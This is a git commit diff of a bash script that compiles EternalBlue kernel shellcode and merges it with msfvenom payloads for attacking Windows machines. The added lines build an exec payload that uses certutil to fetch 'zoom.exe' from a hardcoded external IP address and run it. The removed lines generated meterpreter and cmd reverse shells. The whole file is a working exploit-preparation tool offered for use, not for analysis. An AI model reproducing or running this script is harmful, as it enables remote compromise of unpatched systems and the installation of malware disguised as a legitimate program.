1552430a2209f0e4ff6d1ee6b6d2c8b4630d62cf
nicolaskh8 <elkhoury.nicolas@gmail.com>
2024-03-31 22:50:23 -0400

    Initial Commit

--- shellcode/shell_prep.sh
+++ shellcode/shell_prep.sh
@@ -1,4 +1,13 @@
 #!/bin/bash
+# This script compiles kernel shellcode for both x64 and x86 architectures, specifically tailored for the Eternal Blue exploit.
+# It then generates a payload using msfvenom that utilizes certutil, a command-line utility that's part of Microsoft's
+# Certificate Services, to download and execute the file "zoom.exe" from a specified URL. This technique is often used
+# in penetration testing and by malicious actors to execute remote code on a vulnerable machine as part of the exploitation process.
+# The script concludes by merging the compiled kernel shellcode with the generated payload into a single executable binary
+# for each architecture, ready for deployment in an attack scenario exploiting the Eternal Blue vulnerability.
+
+
+
 set -e
 cat << "EOF"
                  _.-;;-._
@@ -7,90 +16,30 @@ cat << "EOF"
           '-..-'|   ||   |
           '-..-'|_.-''-._|   
 EOF
-echo Eternal Blue Windows Shellcode Compiler
+echo "Eternal Blue Windows Shellcode Compiler"
 echo
-echo Let\'s compile them windoos shellcodezzz
+echo "Let's compile them windoos shellcodezzz"
 echo
-echo Compiling x64 kernel shellcode
+echo "Compiling x64 kernel shellcode"
 nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
-echo 'Compiling x86 kernel shellcode'
+echo "'Compiling x86 kernel shellcode'"
 nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
-echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
-read genMSF
-if [ "$genMSF" = "y" ] || [ "$genMSF" = "Y" ]; then
-    echo LHOST for reverse connection:
-    read ip
-    echo LPORT you want x64 to listen on:
-    read portOne
-    echo LPORT you want x86 to listen on:
-    read portTwo
-    echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
-    read cmd
-    if [ "$cmd" -eq 0 ]; then
-        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
-        read staged
-        if [ "$staged" -eq 0 ]; then
-            echo Generating x64 meterpreter shell \(staged\)...
-            echo
-            echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo 
-            echo Generating x86 meterpreter shell \(staged\)...
-            echo
-            echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        elif [ "$staged" -eq 1 ]; then
-            echo Generating x64 meterpreter shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo 
-            echo Generating x86 meterpreter shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        else
-            echo Invalid option...exiting...
-            exit 1
-        fi
-    elif [ "$cmd" -eq 1 ]; then
-        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
-        read staged
-        if [ "$staged" -eq 0 ]; then
-            echo Generating x64 cmd shell \(staged\)...
-            echo
-            echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo
-            echo Generating x86 cmd shell \(staged\)...
-            echo
-            echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        elif [ "$staged" -eq 1 ]; then
-            echo Generating x64 cmd shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-            echo
-            echo Generating x86 cmd shell \(stageless\)...
-            echo
-            echo msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-            msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        else
-            echo Invalid option...exiting...
-            exit 1
-        fi
-    else
-        echo Invalid option...exiting...
-        exit 1
-    fi
-    echo
-    echo MERGING SHELLCODE WOOOO!!!
-    cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
-    cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-    python3 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
-else
-    echo Okay cool, make sure you merge your own shellcode properly :\)
-fi
-echo DONE
+echo "kernel shellcode compiled"
+
+# Using certutil to download and execute zoom.exe
+CMD="cmd /c certutil -urlcache -f http://3.21.21.191/zoom.exe %TEMP%\\zoom.exe & start %TEMP%\\zoom.exe"
+
+# Generate payload with msfvenom
+echo "Generating payload to download and execute zoom.exe using certutil..."
+msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o sc_x64_msf.bin EXITFUNC=thread
+
+echo "Payload for x64 generated."
+
+echo "MERGING SHELLCODE WOOOO!!!"
+cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+# If there's an x86 version needed, follow similar steps to generate sc_x86_msf.bin and merge it.
+
+echo "Shellcode merged successfully."
+
+echo "DONE"
 exit 0
